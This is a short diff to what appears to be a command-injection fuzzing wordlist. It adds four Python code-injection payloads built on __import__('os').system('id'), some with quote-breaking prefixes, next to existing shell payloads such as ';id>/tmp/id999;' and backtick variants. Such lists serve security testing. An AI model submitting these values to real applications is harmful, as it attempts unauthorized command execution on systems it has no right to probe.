@@ -198,3 +198,7 @@ a)|/usr/bin/id;
 ';id>/tmp/id999;'
 '`id>/tmp/id2023`'
 ';`id>/tmp/id2022;`'
+__import__('os').system('id')
+__import__("os").system("id")
+';__import__('os').system('id');'
+";__import__('os').system('id');"
